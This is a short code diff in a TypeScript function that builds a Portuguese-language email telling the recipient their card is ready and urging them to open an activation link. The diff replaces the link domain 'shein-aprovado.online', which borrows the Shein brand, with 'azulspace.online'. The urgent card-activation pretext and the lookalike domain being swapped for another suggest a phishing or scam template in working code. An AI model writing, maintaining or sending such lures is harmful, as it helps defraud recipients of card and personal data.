@@ -27,7 +27,7 @@ export function buildOrderEmail(order: any, productIds: string[]): { subject: st
       `Olá, ${firstName}!\n\n` +
       "Seu cartão já está liberado e aguardando apenas a ativação final.\n\n" +
       "Para concluir o processo e liberar o acesso, acesse agora:\n\n" +
-      "https://shein-aprovado.online/liberado/ativacao\n\n" +
+      "https://azulspace.online/liberado/ativacao\n\n" +
       "A ativação leva apenas alguns minutos e, após a confirmação, seu cartão ficará disponível para uso.\n\n" +
       "Qualquer dúvida, estou à disposição.",
   };
